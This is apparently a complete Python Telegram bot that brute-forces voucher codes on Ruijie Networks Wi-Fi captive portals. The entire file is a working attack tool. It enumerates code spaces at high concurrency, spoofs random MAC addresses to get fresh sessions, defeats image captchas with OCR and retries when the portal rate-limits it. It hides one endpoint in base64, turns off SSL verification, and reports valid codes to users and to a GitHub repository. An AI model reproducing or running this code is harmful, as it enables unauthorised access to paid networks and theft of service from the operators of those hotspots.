import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").rstrip("/")

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
notify_setting = {}
last_scan_params = {}
pending_brute = {}

session = None
_connector = None
CONCURRENCY = 200
_voucher_sem = None
_start_time = time.monotonic()

# ── WiFiDog sampled logging counter ──────────────────────────────────────
_wifidog_counter = {"total": 0, "success": 0, "limit": 0, "err": 0}

# ── Web server ────────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded, "sha": sha}
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ───────────────────────────────────────────────────────
def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        hours = mins // 60
        minutes = mins % 60
        if hours > 0 and minutes > 0:
            return f"{hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{minutes}m"
    except:
        return str(total_minutes)

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/auth/src/balance.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

# ── Captcha handling ───────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

def detect_portal_type(url):
    if '/api/auth/wifidog' in url or 'wifidog' in url.lower():
        return "wifidog"
    if 'maccauth' in url:
        return "maccauth"
    return "unknown"

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        portal_type = detect_portal_type(session_url)
        if portal_type == "wifidog":
            required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
            return all(k in params for k in required)
        elif portal_type == "maccauth":
            return 'sessionId' in session_url or 'maccauth' in session_url
        return False
    except:
        return False

# ── Maccauth voucher check ─────────────────────────────────────────────
async def perform_check_maccauth(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                return

        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_info = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_info}")

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})

        if notify_setting.get(chat_id, False) and message:
            code_line = "\n\n".join(success_texts[chat_id])
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n\n{code_line}"
                    )
            except:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, False) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except:
                pass
    return None

# ── WiFiDog voucher check ─────────────────────────────────────────────
async def perform_check_wifidog(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    def _p(name, default=""):
        m = re.search(rf'[?&]{name}=([^&]+)', session_url)
        return m.group(1) if m else default

    gw_id   = _p("gw_id")
    gw_sn   = _p("gw_sn")
    gw_addr = _p("gw_address")
    gw_port = _p("gw_port", "2060")
    ip      = _p("ip", "0.0.0.0")
    mac     = _p("mac")
    nasip   = _p("nasip")
    ssid    = _p("ssid", "")

    if not gw_id or not mac:
        return

    _wifidog_counter["total"] += 1

    endpoint = "https://portal-as.ruijienetworks.com/api/auth/wifidog/auth"
    headers = {
        "authority":  "portal-as.ruijienetworks.com",
        "accept":     "*/*",
        "origin":     "https://portal-as.ruijienetworks.com",
        "referer":    session_url,
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
    }
    params = {
        "stage":      "validate",
        "gw_id":      gw_id,
        "gw_sn":      gw_sn,
        "gw_address": gw_addr,
        "gw_port":    gw_port,
        "ip":         ip,
        "mac":        mac,
        "nasip":      nasip,
        "ssid":       ssid,
        "token":      code,
        "auth_code":  code,
    }

    response = None
    status   = 0
    err_msg  = ""

    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=15)
        ) as ts:
            async with ts.get(
                endpoint, params=params, headers=headers,
                allow_redirects=False
            ) as req:
                status   = req.status
                response = await req.text()
    except asyncio.TimeoutError:
        _wifidog_counter["err"] += 1
        err_msg = "TIMEOUT"
    except Exception as e:
        _wifidog_counter["err"] += 1
        err_msg = str(e)[:60]

    # Sampled log — 100 requests တစ်ခါ
    if _wifidog_counter["total"] % 100 == 0:
        print(
            f"[WiFiDog] checked={_wifidog_counter['total']:,} | "
            f"success={_wifidog_counter['success']} | "
            f"limited={_wifidog_counter['limit']} | "
            f"errors={_wifidog_counter['err']} | "
            f"last: code={code} status={status} "
            f"resp={response[:40] if response else err_msg}"
        )

    if status >= 400:
        if status == 429:
            _wifidog_counter["limit"] += 1
            print(f"⚠️ [WiFiDog] RATE LIMITED! status=429")
        return

    if not response:
        return

    if not _wifidog_is_success(response, status):
        return

    _wifidog_counter["success"] += 1
    print(f"🎉 [WiFiDog] SUCCESS! code={code} resp={response[:100]}")

    if recheck:
        return code

    if chat_id not in success_texts:
        success_texts[chat_id] = []
    expire_info = "📋 Plan: WiFiDog | ⏳ Time: Unknown"
    success_texts[chat_id].append(f"🎫 {code}\n   {expire_info}")

    await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})

    if notify_setting.get(chat_id, False) and message:
        code_line = "\n\n".join(success_texts[chat_id])
        try:
            if chat_id not in success_messages:
                sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}")
                success_messages[chat_id] = sent.message_id
            else:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=success_messages[chat_id],
                    text=f"✅ Success Codes:\n\n{code_line}"
                )
        except:
            pass
    return code


def _wifidog_is_success(response_text, status_code):
    if not response_text:
        return False
    txt = response_text.strip()
    success_markers = [
        "Auth: 1", "auth: 1", "auth:1", "Auth:1",
        '"success":true', '"success": true',
        "logonUrl", "login success", "authorized",
    ]
    for marker in success_markers:
        if marker.lower() in txt.lower():
            return True
    fail_markers = [
        "Auth: 0", "auth:0", "invalid", "not found",
        "expired", "limit", "STA", "error",
    ]
    for marker in fail_markers:
        if marker.lower() in txt.lower():
            return False
    if status_code in (301, 302, 303, 307, 308):
        return True
    return False

# ── Unified perform_check ─────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    portal_type = user_data.get(chat_id, {}).get('portal_type') or detect_portal_type(session_url)

    if portal_type == "wifidog":
        return await perform_check_wifidog(
            session_url, code, chat_id,
            scan_id=scan_id, recheck=recheck, message=message
        )
    else:
        return await perform_check_maccauth(
            session_url, code, chat_id,
            scan_id=scan_id, recheck=recheck, message=message
        )

# ── Brute-force runner ────────────────────────────────────────────────
success_messages = {}
limited_messages = {}

async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = None
    if mode in ["6", "7"]:
        total = 10 ** int(mode)

    checked = 0
    found = 0
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "target": target}
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(1000):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message
                    )

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text="✅ Scan completed."
                )
            except:
                pass
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

# ── Bot commands ───────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
        "   WiFiDog + Maccauth URL နှစ်မျိုးလုံး OK\n"
        "/brute <length> [target] - Code စတင်ရှာဖွေရန်\n"
        "   ဥပမာ /brute 6 10\n"
        "   /brute 6 (အားလုံးရှာ)\n"
        "   /brute 8, /brute ascii-lower, /brute all\n"
        "/stop - ရပ်ရန်\n"
        "/resume - ပြန်စရန်\n"
        "/saved - ရှာတွေ့ထားသော codes ကြည့်ရန်\n"
        "/notify - Notification On/Off\n"
        "/recheck - Success codes ပြန်စစ်ရန်\n"
        "/status - (Admin) Bot Status"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data[message.chat.id] = user_data.get(message.chat.id, {})
        user_data[message.chat.id]['session_url'] = url
        user_data[message.chat.id]['portal_type'] = detect_portal_type(url)
        ptype = "🌐 WiFiDog" if detect_portal_type(url) == "wifidog" else "🔐 Maccauth"
        await bot.reply_to(
            message,
            f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n📡 Type: {ptype}\n\n/brute ဖြင့် စတင်ပါ။"
        )
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/brute <length> [target]\nဥပမာ /brute 6 10")
        return

    mode = args[1]
    target = None
    if len(args) >= 3:
        try:
            target = int(args[2])
        except:
            await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "target": target}
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {last_scan_params[chat_id]['mode']}, target: {last_scan_params[chat_id]['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, target, message)

async def start_brute_scan(chat_id, mode, target, original_message):
    progress_msg = await bot.send_message(chat_id, "Preparing...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['target'], message)
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['target'], call.message)
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['target'], call.message)
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    msg = ""
    if success:
        msg += f"✅ **Success Codes** ({len(success)})\n" + "\n\n".join(success) + "\n"
    if limited:
        msg += f"\n⚠️ **Limited Codes** ({len(limited)})\n" + "\n".join(limited)
    await bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, False)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြလည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for entry in success:
        code = entry.split('\n')[0].replace('🎫 ', '').strip()
        recode = await perform_check(
            user_data[chat_id]['session_url'], code, chat_id,
            recheck=True, message=message
        )
        if recode:
            new_success.append(entry)
    if new_success:
        success_texts[chat_id] = new_success
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n" + "\n\n".join(new_success))
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"🌐 Connection: DIRECT (no proxy)\n"
        f"📡 WiFiDog hits: {_wifidog_counter['total']:,}"
    )

# ── Webhook mode ──────────────────────────────────────────────────────
async def run_webhook_mode():
    app = web.Application()
    webhook_path = f"/webhook/{BOT_TOKEN}"

    async def telegram_webhook(request):
        try:
            json_str = await request.text()
            update = Update.de_json(json_str)
            await bot.process_new_updates([update])
        except Exception as e:
            print(f"[Webhook] error: {e}")
        return web.Response(text="OK")

    app.router.add_post(webhook_path, telegram_webhook)
    app.router.add_get('/', handle)

    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8080)))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"[Webhook] Listening on port {port}")

    full_url = f"{WEBHOOK_URL}{webhook_path}"
    try:
        await bot.remove_webhook()
        await asyncio.sleep(1)
        await bot.set_webhook(url=full_url, drop_pending_updates=True)
        print(f"[Webhook] Set: {full_url}")
    except Exception as e:
        print(f"[Webhook] Failed: {e}")
        raise

    asyncio.create_task(github_update_scheduler())
    await asyncio.Event().wait()

# ── Polling ───────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 409:
                print(f"⚠️ 409 Conflict — waiting {backoff}s...")
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 120)
                continue
            print(f"Polling error: {e}. Retry in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Polling error: {e}. Retry in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ── Main ──────────────────────────────────────────────────────────────
async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        if WEBHOOK_URL:
            print(f"[Main] WEBHOOK mode ({WEBHOOK_URL})")
            await run_webhook_mode()
        else:
            print("[Main] POLLING mode")
            app = web.Application()
            app.router.add_get('/', handle)
            runner = web.AppRunner(app)
            await runner.setup()
            port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8080)))
            site = web.TCPSite(runner, '0.0.0.0', port)
            await site.start()
            asyncio.create_task(github_update_scheduler())
            await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
